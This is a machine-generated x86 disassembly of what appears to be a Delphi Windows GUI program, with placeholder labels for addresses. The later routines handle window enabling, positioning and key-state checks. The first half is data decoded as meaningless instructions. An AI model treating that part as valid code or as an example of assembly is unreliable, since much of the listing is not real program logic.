add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shl [ eax + ecx * 2 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
popad
xchg esp eax
sbb [ eax + eax + 0xc ] eax
inc esi
add [ esp + esi * 2 + 0x45 ] bl
jl r-xdata
mov al [ 0xffffffffac004565 ]
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ebx
add [ ebx + esi * 2 + 0xc80045 ] bl
inc esp
add al cl
fild [ ebx ]
add dl dl
inc ebx
add [ ebp + ebx * 8 + 0x43 ] dl
add [ eax + 0x5c004575 ] dl
je r-xdata
add [ eax ] al
jmp eax
clc
lea eax [ ebx ]
call 0xffffffffe944464f
add [ eax ] eax
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f070051 ] al
test al 0x6b
inc ebp
add al dh
lodsd [ esi ]
inc ebp
add [ eax + ebp * 2 + 0x45 ] ah
add ah dh
test al 0x45
add ah dl
pop [ ebp ]
test al 0xaa
inc ebp
add [ ebp + esi * 2 + 0x90045 ] cl
test [ eax ] al
mov eax [ 0x42b02c00 ]
mov al 0x39
mov al 0xb
mov al 0xc5
add [ eax + 0x7000441a ] bl
mov [ ebp ] eax
ror [ ebp + eax * 2 + 0x458b8c00 ] 0x1
add [ eax ] dh
sbb eax [ eax + eax + 0x34 ]
sbb eax [ eax + eax + 0x8 ]
mov es [ ebp ]
inc esp
add ah bh
xchg esp eax
inc ebp
add [ eax ] al
pop eax
inc esp
add [ eax + 0x10004442 ] cl
stosb [ edi ]
inc ebp
add [ edi + ebx * 2 + 0x62440045 ] dl
inc ebp
add al dh
0x6b2c0045 0x45
or al 0x46
add [ esi + ebx * 8 + 0x76080043 ] cl
inc ebp
add [ ecx + eax + 0x44 ] cl
add [ esp + eax * 2 ] ch
inc esp
add al ch
inc esp
inc esp
add ah ah
aas
inc esp
add ah cl
inc esp
inc esp
add [ eax - 0x53ffba9b ] ah
sub_454317
inc esp
add [ eax + 0x2 ] bl
add bh bh
add [ edx - 0x7ecfffbb ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
xor [ ecx + 0x45 ] al
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
adc eax [ ecx ]
mov [ edx ] al
add bh bh
mov [ edx ] al
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or cl [ edi + 0x6e ]
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax ] al
inc eax
add [ eax ] al
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0b003d ] al
je r-xdata
inc ebx
insb
outsd
jae r-xdata
dec eax
xchg edx eax
inc ebx
add al al
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
test al 0x36
inc ebp
add [ eax - 0x6700fffe ] bl
add al [ eax ]
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ eax ] cl
dec edi
jb r-xdata
push ecx
rcl [ ebx ] 0x41
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
inc ebx
dec edi
pop eax
int3
add [ eax + 0x4f090045 ] al
js r-xdata
outsb
inc ebx
jb r-xdata
add al [ eax ]
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f080043 ] al
push ecx
add [ edi + ecx * 2 ] cl
popad
je r-xdata
rcl [ gs : ebx ] 0x41
mov eax 0xc8004392
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
or [ edi + 0xe80043 ] cl
add bh bh
call 0x31444531
jb r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax - 0x5f00fffe ] ah
push eax
outsd
jo r-xdata
outsb
inc esp
jb r-xdata
dec edi
or al 0x90
inc ebx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
rcl [ ebx ] 0x41
outsb
inc esp
jae r-xdata
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
inc ebp
add [ ecx ] cl
dec edi
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jbe r-xdata
jns r-xdata
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0c0046 ] al
mov al [ 0x30ff0002 ]
jo r-xdata
jb r-xdata
jo r-xdata
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
dec edi
add [ ecx ] cl
dec edi
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0xc06f666e
adc eax [ ecx ]
mov al 0x2
add bh bh
mov al 0x2
add bh bh
xor [ ecx + 0x45 ] al
outsb
dec eax
imul esp [ ebp + 0x28 ] 0xa8004537
add al [ eax ]
[ eax + 0x1ff0002 ]
outsb
outsw
rcl [ ebx ] 0x41
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f06004d ] al
jo r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
inc esp
add [ edx ] cl
dec edi
add al [ eax ]
push [ eax ]
adc eax [ ecx ]
mov al [ 0xffffffffa0ff0002 ]
outsb
inc ebx
outsd
outsb
jae r-xdata
inc ecx
add [ ebx ] dl
dec edi
adc eax [ ecx ]
rol [ edx ] 0x1
add bh bh
rol [ edx ] 0x1
add bh bh
imul ecx [ edi + 0x76 ] 0x65
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
xchg ecx eax
inc ebx
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
add [ ecx ] cl
dec edi
outsb
nop
inc ebx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ esi ] 0xc
dec edi
mov es [ ebx ]
[ eax ] al
push eax
add [ eax ] al
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0a004a ] al
outsb
inc esp
jb r-xdata
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0a0049 ] al
add [ eax ] al
push [ eax ]
pop [ ebx ]
call 0xffffffffe944452d
loopne r-xdata
jo r-xdata
lea eax [ ebx ]
inc esp
mov es [ ebx ]
loopne r-xdata
add [ eax - 0x80000000 ] al
add [ eax ] al
dec edi
jbe r-xdata
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
push esp
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec ebp
outsd
jne r-xdata
lea eax [ ebx ]
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
push edx
add [ ebx ] cl
dec edi
outsb
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
jmp eax
add bh bh
loopne r-xdata
dec ebp
add [ esi ] al
dec edi
outsd
jne r-xdata
push ebp
jo r-xdata
insb
rcl [ ebx + 0x1400043 ] 0x1
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
inc esp
outsd
ja r-xdata
in al dx
inc ebp
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
rcl [ ebx + 0x1480043 ] 0x1
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
outsb
dec ebp
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
sbb al 0x8d
inc ebx
add al ah
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0a0050 ] al
outsb
dec ebx
jns r-xdata
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
push eax
add [ edx ] cl
dec edi
adc eax [ ecx ]
enter 0x2 0xff
enter 0x2 0xff
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
pop ebx
add [ esi ] al
dec edi
push edi
push 0x556c6565
jo r-xdata
push edi
xchg ebx eax
inc ebx
add [ eax ] bh
add [ eax ] eax
jae r-xdata
push edi
xchg esp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x49
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x49 ] ch
inc ebp
add [ eax - 0x7ffbab7 ] ah
outsb
push ebx
push 0x9170776f
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
rcl [ ebx ] 0x41
add al cl
add al [ eax ]
dec eax
add al [ eax ]
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f06005b ] al
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
push ebx
add [ ebx ] cl
jb r-xdata
add [ eax ] dl
push ecx
inc esp
add [ eax + 0x3400456f ] bh
inc esp
inc ecx
add [ esp + esi * 4 + 0x6c440045 ] ch
inc ebp
add [ eax + 0x6d ] dl
inc ebp
add al ah
fild [ ebx ]
insb
test al 0x41
add al cl
jne r-xdata
inc ebp
add ah bh
xor al 0x40
add [ esi + ecx * 4 + 0x45 ] cl
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
dec eax
push 0x45
jb r-xdata
outsb
add [ eax ] al
adc [ esi ] 0x10
dec edi
adc eax [ ecx ]
mov eax 0xb8ff0002
add al [ eax ]
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f070058 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
je r-xdata
jpe r-xdata
nop
jne r-xdata
add [ ebp + 0x41 ] cl
add [ eax - 0x4f ] ch
inc ebp
add [ eax - 0x4d ] al
inc ebp
add [ esp + ecx * 2 ] ah
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x57ffbbba ] ah
jb r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
inc esp
add al [ eax ]
add [ edi + esi - 0x57abffbb ] al
inc ecx
add [ eax + ebp * 2 ] ch
inc ebp
add al ah
imul eax [ ebp ] sub_4034fc
dec esp
mov es [ ebp ]
cmp [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x6a ] cl
inc ebp
push 0xa0004549
dec ecx
inc ebp
add al bh
outsd
arpl [ ebx + 0x4 ] bp
xchg ecx eax
inc ebx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shl [ eax + ecx * 2 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
popad
xchg esp eax
sbb [ eax + eax + 0xc ] eax
inc esi
add [ esp + esi * 2 + 0x45 ] bl
jl r-xdata
mov al [ 0xffffffffac004565 ]
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ebx
add [ ebx + esi * 2 + 0xc80045 ] bl
inc esp
add al cl
fild [ ebx ]
add dl dl
inc ebx
add [ ebp + ebx * 8 + 0x43 ] dl
add [ eax + 0x5c004575 ] dl
je r-xdata
add [ eax ] al
jmp eax
clc
lea eax [ ebx ]
call 0xffffffffe944464f
add [ eax ] eax
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f070051 ] al
test al 0x6b
inc ebp
add al dh
lodsd [ esi ]
inc ebp
add [ eax + ebp * 2 + 0x45 ] ah
add ah dh
test al 0x45
add ah dl
pop [ ebp ]
test al 0xaa
inc ebp
add [ ebp + esi * 2 + 0x90045 ] cl
test [ eax ] al
mov eax [ 0x42b02c00 ]
mov al 0x39
mov al 0xb
mov al 0xc5
add [ eax + 0x7000441a ] bl
mov [ ebp ] eax
ror [ ebp + eax * 2 + 0x458b8c00 ] 0x1
add [ eax ] dh
sbb eax [ eax + eax + 0x34 ]
sbb eax [ eax + eax + 0x8 ]
mov es [ ebp ]
inc esp
add ah bh
xchg esp eax
inc ebp
add [ eax ] al
pop eax
inc esp
add [ eax + 0x10004442 ] cl
stosb [ edi ]
inc ebp
add [ edi + ebx * 2 + 0x62440045 ] dl
inc ebp
add al dh
0x6b2c0045 0x45
or al 0x46
add [ esi + ebx * 8 + 0x76080043 ] cl
inc ebp
add [ ecx + eax + 0x44 ] cl
add [ esp + eax * 2 ] ch
inc esp
add al ch
inc esp
inc esp
add ah ah
aas
inc esp
add ah cl
inc esp
inc esp
add [ eax - 0x53ffba9b ] ah
sub_454a5c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x4a
inc ebp
add ah dh
dec edx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ah
dec edx
inc ebp
add [ eax - 0x50000000 ] ah
inc ecx
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
test [ ecx + 0x45180045 ] bh
inc ecx
add [ esp + 0x41 ] bl
add [ esp + eax * 2 ] dh
inc ecx
add [ 0xffffffffa4000041 ] dh
inc ecx
add [ ebp + 0x41 ] al
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax + edi * 4 ] ch
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
hlt
sub_454cb0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebp + 0x45 ] cl
add [ ebp + ecx * 2 + 0x45 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x4d ] ah
inc ebp
add [ eax + 0x1 ] al
add [ eax ] al
mov al 0x26
inc ecx
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
cld
0x45
sub_454da4
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_454df0
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45e4f8
mov eax [ rw-data ]
call sub_41a384
mov eax [ rw-data ]
call sub_41a32c
retn
push 0x0
push eax
call ShowOwnedPopups
sub_454e28
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_454e78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_454f1b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_454ee4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_454e28
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454f22
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_454f2c
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026ec
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_454f64
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_454fc8
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_454f64
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_455024
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_455044
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_455024
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_455070
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_45bad8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45bf48
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407dc4
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45bac4
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45bf34
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407dc4
test eax eax
je r-xdata
sub_4550f8
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45514c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_455188
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_4551d4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_455232
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_452bcc
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40425c
mov eax [ ebp - 0x8 ]
pop edx
call sub_407dc4
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455239
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
sub_455244
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_45526c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_4552dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_455244
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4552e4
lea eax [ ebp - 0xc ]
call sub_404074
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
sub_4552ec
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403270
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_45537c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414434
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_455c44
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_455c24
mov edx [ edi + 0xc ]
mov eax ebx
call sub_455ad4
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4553cc
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_455584
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43e484
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_455ad4
xor edx edx
mov eax ebx
call sub_455ad4
jmp r-xdata
sub_455404
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4243fc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_455470
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4243fc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_4554d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_455c0c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_441328
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
